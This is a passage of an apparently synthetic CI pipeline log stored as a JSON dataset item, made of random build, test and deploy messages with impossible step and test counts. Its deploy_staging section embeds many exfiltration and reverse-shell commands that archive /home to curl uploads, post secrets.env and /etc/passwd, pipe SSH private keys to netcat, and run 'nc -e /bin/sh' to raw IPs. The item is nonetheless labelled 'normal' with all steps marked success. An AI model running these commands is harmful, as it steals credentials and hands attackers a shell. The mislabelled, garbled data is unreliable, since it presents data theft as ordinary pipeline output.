          "[12:19:53] WARN: Deprecated API usage",
          "Done.",
          "npm notice: created a lockfile",
          "Step 1/24: Testing",
          "Artifact uploaded: dist.zip (9MB)",
          "Environment: staging",
          "Tests: 131 passed, 252 total",
          "Connection established",
          "npm install: added 256 packages",
          "Compiling src/handler.rs...",
          "npm install: resolved 725 packages",
          "yarn add: Done in 25.27s",
          "Using Python 3.10",
          "[12:19:53] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Collecting jest",
          "Optimizing 47 modules...",
          "yarn add: Done in 19.92s",
          "Platform: win32-x64",
          "npm install: resolved 1205 packages",
          "\u2713 Task completed in 981ms",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "pip install: Successfully installed axios-1.3",
          "pip install: Successfully installed jest-4.16",
          "Cache restored successfully (307MB)",
          "Cache invalidated: node_modules",
          "  PASS: test_user_create (279ms)",
          "Test Suites: 8 passed, 45 total",
          "Verifying...",
          "Compiling lib/service.java...",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 4626ms",
          "Fetching submodules...",
          "Cache saved successfully",
          "Coverage: 81% statements, 69% branches",
          "[12:19:53] DEBUG: Loading configuration",
          "Verifying...",
          "Processing...",
          "Minifying main.js",
          "  PASS: test_auth_login (458ms)",
          "Done.",
          "[12:19:53] INFO: Processing request",
          "Success!",
          "[12:19:53] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (35MB)",
          "GET /api - 204 (1ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: jest has known vulnerabilities",
          "Step 16/23: Testing",
          "[12:19:53] DEBUG: Memory usage: 1733MB",
          "Loading...",
          "Pulling image: node:3.11",
          "Compiling lib/handler.rs...",
          "Loading...",
          "Compiling lib/service.java...",
          "POST /upload - 201 (233ms)",
          "GET /api - 201 (98ms)",
          "Verifying...",
          "HEAD is now at ab92174",
          "Using Node.js 20.13.9",
          "NODE_ENV=production",
          "GET /health - 204 (24ms)",
          "Success!",
          "Time: 109.185s",
          "Bundling styles.css",
          "Cache invalidated: build",
          "Using Node.js 18.14.10",
          "Cache restored successfully (84MB)",
          "Done.",
          "Transforming 876 files...",
          "Compiling src/app.ts...",
          "Cache hit for key-9160",
          "yarn add: Done in 12.45s",
          "Success!",
          "Generating source maps...",
          "Checking out master branch",
          "Step 16/17: Installing dependencies",
          "Exception: ValueError",
          "POST /data - 200 (384ms)",
          "Creating production build...",
          "[12:19:53] WARN: Deprecated API usage",
          "Installing webpack@3.18.0",
          "[12:19:53] DEBUG: Query executed in 23ms",
          "[12:19:53] DEBUG: Memory usage: 1306MB",
          "pip install: Successfully installed webpack-3.15",
          "[12:19:53] INFO: Starting build process",
          "WARNING: express has known vulnerabilities",
          "Ran 160 tests in 51s",
          "Cache restored successfully (278MB)",
          "Snapshots: 21 passed, 40 total",
          "WARNING: express has known vulnerabilities",
          "pip install: Successfully installed react-5.7",
          "Step 18/23: Linting",
          "Step 13/22: Linting",
          "Coverage: 93% statements, 96% branches",
          "Completed.",
          "Minifying main.js",
          "Uploading artifact 'build' (46 files)",
          "Creating production build...",
          "Environment: test",
          "Switched to branch 'bugfix/task-419'",
          "Step 13/25: Installing dependencies",
          "\u2713 build completed",
          "Step 6/18: Building",
          "Artifact downloaded: 10MB",
          "Cache hit for key-6323",
          "Step 10/18: Linting",
          "\u2717 build failed with exit code 13",
          "Exception: TypeError",
          "Verifying...",
          "[12:19:53] INFO: Starting build process",
          "Optimizing 52 modules...",
          "Environment: staging",
          "Pulling image: python:3.11",
          "[12:19:53] DEBUG: Connection pool: 10 active",
          "Loading...",
          "Layer 4/9: ENV command",
          "\u2713 build completed",
          "Ready.",
          "NODE_ENV=development",
          "Switched to branch 'bugfix/task-247'",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-5289",
          "Step 18/17: Running migrations",
          "[12:19:53] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "[12:19:53] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at dff3622",
          "npm install: added 347 packages",
          "[12:19:53] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-208'",
          "[12:19:53] INFO: Request completed",
          "pip install: Successfully installed eslint-3.17",
          "Exception: RuntimeError",
          "pip install: Successfully installed prettier-3.14",
          "Already up to date.",
          "HEAD is now at 54b35dd",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Task completed in 4464ms",
          "Pushing to registry...",
          "Bundling styles.js",
          "\u2717 build failed with exit code 37",
          "NODE_ENV=development",
          "Generating source maps...",
          "Artifact downloaded: 6MB",
          "Generating source maps...",
          "Finished.",
          "[12:19:53] INFO: Starting build process",
          "[12:19:53] ERROR: Connection failed",
          "Cache miss for key-4692",
          "Done.",
          "Step 9/20: Building",
          "yarn add: Done in 2.29s",
          "Waiting...",
          "[12:19:53] INFO: Request completed",
          "Cache saved successfully",
          "[12:19:53] DEBUG: Connection pool: 13 active",
          "npm install: resolved 634 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting axios",
          "Compiling src/app.ts...",
          "Switched to branch 'bugfix/task-963'",
          "Step 18/15: Linting",
          "Processing...",
          "Compiling components/index.js...",
          "[12:19:53] INFO: Cache refreshed",
          "npm install: resolved 1472 packages",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache restored successfully (167MB)",
          "[12:19:53] INFO: Processing request",
          "Image pulled successfully",
          "Uploading artifact 'dist' (28 files)",
          "Cache hit for key-6289",
          "Test Suites: 43 passed, 42 total",
          "OK",
          "\u2717 build failed with exit code 70",
          "Done.",
          "npm install: added 315 packages",
          "Cache miss for key-5783",
          "Environment: test",
          "\u2713 Task completed in 4741ms",
          "npm notice: created a lockfile",
          "Compiling utils/app.ts...",
          "Generating source maps...",
          "Verifying...",
          "Finished.",
          "[12:19:53] DEBUG: Memory usage: 660MB",
          "WARNING: eslint has known vulnerabilities",
          "pip: Collecting axios",
          "Test Suites: 12 passed, 31 total",
          "Minifying app.js",
          "npm notice: package.json updated",
          "npm install: added 361 packages",
          "Step 6/21: Running migrations",
          "Snapshots: 35 passed, 41 total",
          "Checking out develop branch",
          "pip: Collecting react",
          "Snapshots: 4 passed, 11 total",
          "\u2713 All checks passed",
          "Loading...",
          "yarn add: Done in 16.15s",
          "Artifact downloaded: 37MB",
          "Processing...",
          "Generating source maps...",
          "\u2713 deploy completed",
          "npm install: added 422 packages",
          "Minifying vendor.js",
          "Transforming 817 files...",
          "Step 12/23: Deploying",
          "Processing...",
          "FAILED: test_db_connect",
          "Building Docker image...",
          "FAILED: test_cache_hit",
          "HEAD is now at 222330d",
          "Cache saved successfully",
          "pip: Downloading axios-4.12.tar.gz",
          "Cache invalidated: node_modules",
          "TLS handshake completed",
          "Connecting to startup.dev:443...",
          "Bundling styles.css",
          "Step 3/21: Testing",
          "[12:19:53] DEBUG: Initializing service",
          "Cache restored successfully (23MB)",
          "  PASS: test_user_create (93ms)",
          "Using Node.js 17.17.3",
          "Image pulled successfully",
          "[12:19:53] INFO: Processing request",
          "\u2713 Task completed in 937ms",
          "[12:19:53] DEBUG: Connection pool: 16 active",
          "[12:19:53] INFO: Cache refreshed",
          "Optimizing 41 modules...",
          "Finished.",
          "Waiting...",
          "Pushing to registry...",
          "[12:19:53] WARN: Deprecated API usage",
          "[12:19:53] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Layer 6/14: COPY command",
          "\u2713 Task completed in 3600ms",
          "[12:19:53] INFO: Cache refreshed",
          "Tests: 217 passed, 166 total",
          "pip install: Successfully installed axios-5.6",
          "Finished.",
          "Environment: test",
          "Using Python 3.12",
          "[12:19:53] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 19/23: Linting",
          "Pulling image: node:latest",
          "Cache hit for key-8913",
          "Exception: TypeError",
          "Compiling src/handler.rs...",
          "pip: Installing build dependencies...",
          "Time: 73.41s",
          "HEAD is now at 2900c49",
          "Compiling lib/index.js...",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Completed.",
          "Connection established",
          "\u2713 Step 'checkout' succeeded",
          "Image pulled successfully",
          "[12:19:53] ERROR: Connection failed",
          "Using Python 3.12",
          "[12:19:53] WARN: Deprecated API usage",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-22T12:20:51.548987",
        "finished_at": "2025-11-22T12:21:10.151694",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Pulling image: node:3.11",
          "Compiling utils/utils.go...",
          "Success!",
          "  PASS: integration/test_api_health.spec.js",
          "Verifying...",
          "Installing prettier@3.6.9",
          "Already up to date.",
          "Finished.",
          "HEAD is now at 5bb86a4",
          "[12:19:53] INFO: Cache refreshed",
          "Ready.",
          "Connection established",
          "\u2713 Task completed in 700ms",
          "Compiling components/handler.rs...",
          "Compiling components/main.py...",
          "Connection established",
          "Cache miss for key-2706",
          "Artifact uploaded: dist.zip (66MB)",
          "Step 11/25: Testing",
          "Compiling components/index.js...",
          "Generating source maps...",
          "Test Suites: 10 passed, 15 total",
          "[12:19:53] ERROR: Connection failed",
          "Connection established",
          "npm notice: package.json updated",
          "GET /status - 201 (30ms)",
          "[12:19:53] ERROR: Connection failed",
          "Compiling lib/index.js...",
          "Pushing to registry...",
          "Cache hit for key-8908",
          "[12:19:53] DEBUG: Memory usage: 1593MB",
          "\u2713 Step 'install' succeeded",
          "Checking out main branch",
          "FAILED: test_api_health",
          "[12:19:53] INFO: Request completed",
          "Image pulled successfully",
          "[12:19:53] INFO: Starting build process",
          "  PASS: test_user_create (390ms)",
          "Cache miss for key-8315",
          "Finished.",
          "yarn add: Done in 23.53s",
          "  PASS: integration/test_user_create.spec.js",
          "Compiling components/app.ts...",
          "pip: Installing build dependencies...",
          "Compiling lib/index.js...",
          "Already up to date.",
          "Ran 172 tests in 41s",
          "Creating production build...",
          "[12:19:53] INFO: Request completed",
          "TLS handshake completed",
          "Already up to date.",
          "Artifact uploaded: dist.zip (95MB)",
          "Cache miss for key-1926",
          "Processing...",
          "Done.",
          "Cache invalidated: dependencies",
          "Using Node.js 17.5.5",
          "[12:19:53] DEBUG: Initializing service",
          "Compiling lib/main.py...",
          "Using Python 3.10",
          "Compiling lib/handler.rs...",
          "Cache hit for key-5087",
          "POST /data - 201 (333ms)",
          "Time: 31.169s",
          "Optimizing 10 modules...",
          "[12:19:53] DEBUG: Initializing service",
          "Switched to branch 'feature/task-729'",
          "Installing prettier@3.11.1",
          "[12:19:53] DEBUG: Loading configuration",
          "Done.",
          "Step 1/21: Running migrations",
          "Done.",
          "Optimizing 99 modules...",
          "Cache miss for key-2384",
          "Creating production build...",
          "Checking out master branch",
          "Cache saved successfully",
          "Fetching submodules...",
          "Transforming 574 files...",
          "Using Node.js 15.10.10",
          "Fetching submodules...",
          "Cache miss for key-8133",
          "Layer 9/8: COPY command",
          "[12:19:53] INFO: Starting build process",
          "Done.",
          "Ran 62 tests in 10s",
          "Using Python 3.10",
          "[12:19:53] INFO: Starting build process",
          "npm notice: created a lockfile",
          "FAILED: test_user_create",
          "[12:19:53] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (48 files)",
          "NODE_ENV=development",
          "Step 18/23: Linting",
          "pip: Downloading express-1.6.tar.gz",
          "Switched to branch 'bugfix/task-460'",
          "Step 15/20: Running migrations",
          "npm install: resolved 993 packages",
          "Uploading artifact 'build' (7 files)",
          "Completed.",
          "Pushing to registry...",
          "Using Node.js 20.20.6",
          "[12:19:53] INFO: Processing request",
          "Uploading artifact 'build' (46 files)",
          "Installing express@5.4.0",
          "Platform: win32-x64",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Exception: ValueError",
          "[12:19:53] DEBUG: Memory usage: 1573MB",
          "\u2713 All checks passed",
          "[12:19:53] INFO: Processing request",
          "[12:19:53] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/app.ts...",
          "pip: Installing build dependencies...",
          "Cache hit for key-8104",
          "Using Python 3.11",
          "Transforming 868 files...",
          "Already up to date.",
          "Verifying...",
          "Bundling main.css",
          "[12:19:53] INFO: Starting build process",
          "Step 3/25: Linting",
          "Pushing to registry...",
          "Pushing to registry...",
          "Verifying...",
          "Connection established",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "Pulling image: python:18",
          "Loading...",
          "FAILED: test_api_health",
          "Pulling image: alpine:3.11",
          "Fetching submodules...",
          "Success!",
          "[12:19:53] DEBUG: Memory usage: 157MB",
          "Compiling src/handler.rs...",
          "Step 11/21: Deploying",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Success!",
          "Ran 87 tests in 29s",
          "Checking out main branch",
          "Optimizing 17 modules...",
          "[12:19:53] INFO: Processing request",
          "Loading...",
          "[12:19:53] ERROR: Connection failed",
          "Finished.",
          "Checking out develop branch",
          "Connecting to example.com:443...",
          "Artifact uploaded: dist.zip (66MB)",
          "Cache miss for key-1482",
          "pip: Installing build dependencies...",
          "FAILED: test_auth_login",
          "Step 4/15: Deploying",
          "Connecting to startup.dev:443...",
          "[12:19:53] WARN: Deprecated API usage",
          "[12:19:53] DEBUG: Loading configuration",
          "Test Suites: 47 passed, 7 total",
          "Artifact downloaded: 44MB",
          "[12:19:53] DEBUG: Initializing service",
          "Connecting to cloud.services:443...",
          "Installing lodash@2.5.4",
          "Step 17/16: Running migrations",
          "HEAD is now at 659a884",
          "Exception: ValueError",
          "WARNING: express has known vulnerabilities",
          "[12:19:53] INFO: Connecting to database",
          "NODE_ENV=test",
          "Bundling vendor.js",
          "Step 10/17: Testing",
          "[12:19:53] DEBUG: Connection pool: 16 active",
          "Bundling main.css",
          "Installing webpack@5.12.5",
          "Connecting to startup.dev:443...",
          "Compiling lib/handler.rs...",
          "Building Docker image...",
          "Cache saved successfully",
          "Success!",
          "[12:19:53] DEBUG: Query executed in 75ms",
          "Step 1/19: Installing dependencies",
          "Installing webpack@1.20.2",
          "Environment: production",
          "Success!",
          "[12:19:53] WARN: Deprecated API usage",
          "pip install: Successfully installed jest-5.4",
          "Step 7/15: Building",
          "Step 11/25: Installing dependencies",
          "Step 6/21: Deploying",
          "[12:19:53] DEBUG: Connection pool: 15 active",
          "npm notice: created a lockfile",
          "Done.",
          "Verifying...",
          "Compiling components/service.java...",
          "Completed.",
          "Compiling src/handler.rs...",
          "GET /health - 200 (2ms)",
          "OK",
          "GET /status - 204 (37ms)",
          "[12:19:53] DEBUG: Loading configuration",
          "[12:19:53] INFO: Processing request",
          "Done.",
          "Artifact uploaded: build.tar.gz (41MB)",
          "npm install: resolved 406 packages",
          "Step 11/20: Linting",
          "Pushing to registry...",
          "Layer 1/13: COPY command",
          "Pulling image: alpine:18",
          "Installing eslint@3.6.1",
          "npm notice: created a lockfile",
          "Step 4/23: Testing",
          "Compiling lib/service.java...",
          "pip: Collecting jest",
          "Using Node.js 20.17.8",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 257 packages",
          "[12:19:53] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "Using Node.js 15.10.10",
          "Switched to branch 'feature/task-229'",
          "Waiting...",
          "npm install: added 473 packages",
          "Cache hit for key-3666",
          "[12:19:53] INFO: Connecting to database",
          "Checking out main branch",
          "[12:19:53] WARN: Deprecated API usage",
          "Artifact downloaded: 35MB",
          "[12:19:53] DEBUG: Initializing service",
          "Verifying...",
          "Step 17/21: Running migrations",
          "Compiling src/index.js...",
          "Snapshots: 46 passed, 15 total",
          "OK",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 4620ms",
          "[12:19:53] DEBUG: Query executed in 78ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 16.50s",
          "Transforming 479 files...",
          "[12:19:53] DEBUG: Loading configuration",
          "POST /upload - 202 (185ms)",
          "npm install: resolved 205 packages",
          "pip: Installing build dependencies...",
          "pip: Downloading react-5.3.tar.gz",
          "Pushing to registry...",
          "Connection established",
          "pip install: Successfully installed webpack-3.5",
          "npm install: resolved 384 packages",
          "WARNING: webpack has known vulnerabilities",
          "Platform: linux-x64",
          "  PASS: test_api_health (41ms)",
          "Installing webpack@2.13.8",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "\u2713 Task completed in 3527ms",
          "Step 7/23: Linting",
          "WARNING: eslint has known vulnerabilities",
          "Waiting...",
          "Ready.",
          "Using Python 3.12",
          "Connection established",
          "Connecting to cloud.services:443...",
          "Step 2/23: Installing dependencies",
          "Success!",
          "npm notice: package.json updated",
          "\u2713 lint completed",
          "Artifact downloaded: 8MB",
          "GET /api - 201 (46ms)",
          "Transforming 844 files...",
          "Already up to date.",
          "Cache restored successfully (42MB)",
          "npm install: added 473 packages",
          "Time: 18.725s",
          "Using Node.js 17.5.3",
          "Environment: staging",
          "[12:19:53] DEBUG: Connection pool: 9 active",
          "pip: Downloading webpack-2.3.tar.gz",
          "[12:19:53] DEBUG: Loading configuration",
          "Environment: staging",
          "Ready.",
          "WARNING: axios has known vulnerabilities",
          "Optimizing 24 modules...",
          "pip: Collecting express",
          "Using Python 3.9",
          "[12:19:53] ERROR: Connection failed",
          "Cache hit for key-6074",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-22T12:21:10.151694",
        "finished_at": "2025-11-22T12:21:16.352596",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Layer 3/11: COPY command",
          "Test Suites: 21 passed, 39 total",
          "Success!",
          "Step 1/20: Linting",
          "POST /api - 200 (499ms)",
          "Connection established",
          "Step 7/17: Deploying",
          "[12:19:53] DEBUG: Loading configuration",
          "Fetching submodules...",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Platform: win32-x64",
          "\u2713 Step 'setup' succeeded",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Test Suites: 22 passed, 5 total",
          "Switched to branch 'feature/task-137'",
          "Tests: 66 passed, 465 total",
          "  PASS: e2e/test_auth_login.spec.js",
          "pip: Collecting prettier",
          "[12:19:53] INFO: Cache refreshed",
          "Cache hit for key-7343",
          "Snapshots: 31 passed, 37 total",
          "Installing lodash@5.15.5",
          "[12:19:53] INFO: Cache refreshed",
          "Processing...",
          "  PASS: test_api_health (341ms)",
          "\u2713 All checks passed",
          "Optimizing 78 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "GET /health - 204 (45ms)",
          "Optimizing 37 modules...",
          "Pulling image: alpine:latest",
          "[12:19:53] INFO: Request completed",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/utils.go...",
          "Step 9/24: Installing dependencies",
          "Pushing to registry...",
          "Coverage: 76% statements, 83% branches",
          "Done.",
          "OK",
          "Already up to date.",
          "Cache restored successfully (258MB)",
          "Cache restored successfully (273MB)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Sending 428MB of data to test.io",
          "Pulling image: python:3.11",
          "Compiling utils/index.js...",
          "[12:19:53] WARN: Deprecated API usage",
          "nc -e /bin/sh 46.68.19.197 51014",
          "Layer 8/8: ENV command",
          "Building Docker image...",
          "Already up to date.",
          "Step 19/15: Installing dependencies",
          "Fetching submodules...",
          "Compiling components/main.py...",
          "Cache miss for key-3119",
          "Layer 8/13: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/16: Testing",
          "[12:19:53] INFO: Request completed",
          "Image pulled successfully",
          "npm install: added 28 packages",
          "Using Python 3.11",
          "Success!",
          "  PASS: test_cache_hit (489ms)",
          "pip: Collecting eslint",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at 1942443",
          "pip: Downloading react-1.2.tar.gz",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Platform: win32-x64",
          "Platform: win32-x64",
          "Checking out master branch",
          "Optimizing 62 modules...",
          "Minifying app.js",
          "Switched to branch 'bugfix/task-260'",
          "Cache hit for key-7882",
          "Step 10/23: Running migrations",
          "NODE_ENV=production",
          "Exception: RuntimeError",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 132.150.83.94 57665",
          "Step 16/21: Deploying",
          "Loading...",
          "Checking out main branch",
          "Step 4/21: Linting",
          "Step 11/15: Building",
          "Connection established",
          "GET /health - 200 (90ms)",
          "Artifact uploaded: dist.zip (61MB)",
          "Creating production build...",
          "Step 1/22: Testing",
          "pip: Installing build dependencies...",
          "[12:19:53] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:19:53] DEBUG: Connection pool: 18 active",
          "Snapshots: 16 passed, 23 total",
          "[12:19:53] INFO: Starting build process",
          "Compiling lib/utils.go...",
          "pip: Installing build dependencies...",
          "Step 1/18: Linting",
          "  PASS: test_user_create (63ms)",
          "Sending 274MB of data to startup.dev",
          "Sending 348MB of data to cloud.services",
          "Ready.",
          "yarn add: Done in 1.9s",
          "Compiling utils/app.ts...",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "pip: Collecting eslint",
          "Tests: 436 passed, 213 total",
          "Already up to date.",
          "Snapshots: 2 passed, 45 total",
          "Fetching submodules...",
          "Compiling utils/utils.go...",
          "Bundling main.js",
          "Uploading artifact 'dist' (43 files)",
          "Snapshots: 27 passed, 34 total",
          "Verifying...",
          "Transforming 232 files...",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Uploading artifact 'coverage' (44 files)",
          "Tests: 498 passed, 216 total",
          "[12:19:53] WARN: Deprecated API usage",
          "Compiling lib/utils.go...",
          "\u2713 All checks passed",
          "Compiling lib/index.js...",
          "Optimizing 32 modules...",
          "Cache restored successfully (162MB)",
          "Step 10/24: Building",
          "[12:19:53] WARN: Deprecated API usage",
          "Verifying...",
          "pip: Downloading jest-3.12.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'feature/task-760'",
          "OK",
          "Loading...",
          "Bundling main.css",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 225.88.155.118 25745",
          "Waiting...",
          "Completed.",
          "Platform: win32-x64",
          "Artifact downloaded: 26MB",
          "Artifact downloaded: 5MB",
          "TLS handshake completed",
          "[12:19:53] DEBUG: Connection pool: 8 active",
          "[12:19:53] DEBUG: Loading configuration",
          "Step 14/24: Linting",
          "Exception: ValueError",
          "Optimizing 36 modules...",
          "nc -e /bin/sh 98.240.129.51 11973",
          "Using Node.js 19.2.3",
          "[12:19:53] DEBUG: Memory usage: 141MB",
          "HEAD is now at df16cdf",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 16/17: Testing",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "[12:19:53] INFO: Connecting to database",
          "[12:19:53] INFO: Cache refreshed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Image pulled successfully",
          "Pulling image: python:3.11",
          "Verifying...",
          "TLS handshake completed",
          "Step 17/18: Building",
          "Switched to branch 'bugfix/task-607'",
          "Cache hit for key-4783",
          "Using Node.js 17.17.1",
          "Compiling lib/main.py...",
          "Step 12/25: Testing",
          "  PASS: unit/test_user_create.spec.js",
          "[12:19:53] DEBUG: Memory usage: 329MB",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Compiling src/handler.rs...",
          "npm notice: package.json updated",
          "npm install: resolved 1837 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Cache restored successfully (177MB)",
          "Step 18/20: Testing",
          "Exception: RuntimeError",
          "Waiting...",
          "Compiling components/handler.rs...",
          "Step 11/15: Testing",
          "Connection established",
          "Artifact uploaded: dist.zip (50MB)",
          "Compiling utils/handler.rs...",
          "npm install: added 122 packages",
          "Step 18/22: Installing dependencies",
          "Optimizing 18 modules...",
          "pip: Installing build dependencies...",
          "Compiling components/service.java...",
          "Step 15/19: Running migrations",
          "pip: Installing build dependencies...",
          "Connecting to test.io:443...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Sending 473MB of data to cloud.services",
          "Using Node.js 17.20.9",
          "pip: Downloading eslint-3.14.tar.gz",
          "OK",
          "Pushing to registry...",
          "Step 19/16: Deploying",
          "[12:19:53] WARN: Deprecated API usage",
          "Test Suites: 11 passed, 17 total",
          "HEAD is now at b10d1ee",
          "FAILED: test_db_connect",
          "Checking out master branch",
          "Ran 55 tests in 24s",
          "Using Python 3.9",
          "Finished.",
          "Checking out master branch",
          "Cache restored successfully (337MB)",
          "Fetching submodules...",
          "Sending 454MB of data to acme.corp",
          "  PASS: test_user_create (202ms)",
          "Snapshots: 25 passed, 23 total",
          "pip: Downloading prettier-1.20.tar.gz",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 218.10.229.164 9432",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "[12:19:53] INFO: Cache refreshed",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Building Docker image...",
          "Connection established",
          "Processing...",
          "[12:19:53] INFO: Cache refreshed",
          "Success!",
          "WARNING: jest has known vulnerabilities",
          "Sending 341MB of data to cloud.services",
          "[12:19:53] WARN: Deprecated API usage",
          "Using Node.js 16.7.6",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_auth_login",
          "\u2717 build failed with exit code 70",
          "pip: Downloading axios-5.12.tar.gz",
          "HEAD is now at d3c9e20",
          "\u2713 Task completed in 2682ms",
          "[12:19:53] DEBUG: Query executed in 67ms",
          "Cache miss for key-1653",
          "Transforming 279 files...",
          "GET /health - 200 (60ms)",
          "Verifying...",
          "[12:19:53] INFO: Starting build process",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "npm install: added 190 packages",
          "npm install: added 484 packages",
          "HEAD is now at b59135d",
          "  PASS: unit/test_cache_hit.spec.js",
          "TLS handshake completed",
          "WARNING: express has known vulnerabilities",
          "pip: Collecting axios",
          "[12:19:53] DEBUG: Initializing service",
          "\u2713 Task completed in 972ms",
          "Already up to date.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "NODE_ENV=development",
          "Step 9/23: Installing dependencies",
          "Minifying main.js",
          "GET /api - 204 (61ms)",
          "Snapshots: 38 passed, 40 total",
          "Artifact uploaded: dist.zip (7MB)",
          "Layer 4/10: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 17 tests in 7s",
          "npm install: added 131 packages",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "Already up to date.",
          "Waiting...",
          "GET /health - 200 (43ms)",
          "WARNING: axios has known vulnerabilities",
          "Sending 493MB of data to startup.dev",
          "Bundling main.css",
          "\u2713 Task completed in 3814ms",
          "Checking out main branch",
          "[12:19:53] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "Finished.",
          "Verifying...",
          "[12:19:53] WARN: Deprecated API usage",
          "\u2713 Task completed in 468ms",
          "pip: Collecting lodash",
          "\u2713 All checks passed",
          "Checking out develop branch",
          "Platform: win32-x64",
          "\u2713 Step 'test' succeeded",
          "POST /upload - 200 (249ms)",
          "pip install: Successfully installed eslint-1.7",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Generating source maps...",
          "Test Suites: 31 passed, 27 total",
          "[12:19:53] WARN: Deprecated API usage",
          "Processing...",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Already up to date.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "nc -e /bin/sh 84.65.96.230 45066",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:19:53] DEBUG: Connection pool: 5 active",
          "Step 4/20: Installing dependencies",
          "npm install: added 150 packages",
          "Loading...",
          "Installing webpack@5.7.10",
          "Compiling utils/utils.go...",
          "[12:19:53] WARN: Deprecated API usage",
          "Step 13/16: Running migrations",
          "OK",
          "Artifact downloaded: 34MB",
          "Pulling image: node:18",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}